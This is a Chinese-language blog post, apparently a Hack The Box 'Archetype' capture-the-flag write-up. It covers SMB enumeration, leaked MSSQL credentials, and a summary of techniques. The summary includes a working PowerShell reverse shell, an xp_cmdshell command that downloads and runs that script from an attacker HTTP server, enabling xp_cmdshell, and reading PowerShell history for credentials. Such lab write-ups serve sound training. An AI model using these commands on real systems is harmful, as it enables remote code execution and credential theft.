<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Hackthebox-Archetype - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>Hackthebox-Archetype</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
<div class="container text-center mt-3">
    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
</div>
</div>
<div class="meta">
  <div>2020-12-06 15:30</div>
  <div>
    <span><a href="https://getshe11.com/tags/hackthebox/">#hackthebox</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。</p>
<p>这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。</p>
<h1 id="0x02-过程">0x02 过程</h1>
<p>拿到ip先上nmap：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/1.png" alt=""></p>
<p>我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～</p>
<p>看到445可以用smb工具来连接查看下有什么共享信息：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/2.png" alt=""></p>
<p>尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/3.png" alt=""></p>
<p>看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/4.png" alt=""></p>
<p>但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/1.png" alt=""></p>
<p>剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea</p>
<h1 id="0x03-总结">0x03 总结</h1>
<p>1、smbclient命令</p>
<p><code>smbclient(选项)(参数)</code></p>
<pre><code>-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址；
-d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度；
-E：将信息送到标准错误输出设备；
-h：显示帮助；
-i&lt;范围&gt;：设置NetBIOS名称范围；
-I&lt;IP地址&gt;：指定服务器的IP地址；
-l&lt;记录文件&gt;：指定记录文件的名称；
-L：显示服务器端所分享出来的所有资源；
-M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机；
-n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称；
-N：不用询问密码；
-O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项；
-p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号；
-R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序；
-s&lt;目录&gt;：指定smb.conf所在的目录；
-t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称；
-T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件；
-U&lt;用户名称&gt;：指定用户名称；
-w&lt;工作群组&gt;：指定工作群组名称。
</code></pre><p>连接服务器<code>smbclient //192.168.0.1/tmp  -U username%password</code></p>
<p>2、mssql开启xp_cmdshell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;Show Advanced Options&#39;</span>, <span style="color:#ae81ff">1</span>;			<span style="color:#960050;background-color:#1e0010">\\使用</span>sp_configure系统存储过程<span style="color:#960050;background-color:#1e0010">，设置服务器配置选项，将</span><span style="color:#66d9ef">Show</span> Advanced Options设置为1时<span style="color:#960050;background-color:#1e0010">，允许修改数据库的高级配置选项</span>
reconfigure;											<span style="color:#960050;background-color:#1e0010">\\确认上面的操作</span>
sp_configure;											<span style="color:#960050;background-color:#1e0010">\\查看当前</span>sp_configure配置情况
<span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#ae81ff">1</span>						<span style="color:#960050;background-color:#1e0010">\\使用</span>sp_configure系存储过程<span style="color:#960050;background-color:#1e0010">，启用</span>xp_cmdshell参数<span style="color:#960050;background-color:#1e0010">，来允许</span><span style="color:#66d9ef">SQL</span> Server调用操作系统命令
reconfigure;											<span style="color:#960050;background-color:#1e0010">\\确认上面的操作</span>
xp_cmdshell <span style="color:#e6db74">&#34;whoami&#34;</span> 									<span style="color:#960050;background-color:#1e0010">\\在靶机上调用</span>cmdshell执行whoami
</code></pre></div><p>3、使用mssql的xp_cmdshell反弹shell</p>
<p>建立一个powershell的反向shell文件shell.ps1</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;10.10.14.33&#34;</span>,443);$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..65535|%{0};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + <span style="color:#e6db74">&#34;# &#34;</span>;$sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

</code></pre></div><p>使用python搭建一个迷你http服务器</p>
<pre><code>python3 -m http.server 80
nc -nvvlp 443 //监听
</code></pre><p>数据库执行命令:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">xp_cmdshell <span style="color:#e6db74">&#34;powershell &#34;</span>IEX (<span style="color:#66d9ef">New</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Object</span> Net.WebClient).DownloadString(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;http://10.10.14.33/shell.ps1\&#34;</span>);<span style="color:#e6db74">&#34;
</span></code></pre></div><p>4、访问PowerShell历史记录文件</p>
<pre><code>type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</code></pre><p>5、使用psexec</p>
<p>官方文档：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</p>
<p>也可以使用Impacket的psexec.p y user@ip</p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e8%bf%87%e7%a8%8b">
                            0x02 过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%80%bb%e7%bb%93">
                            0x03 总结
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
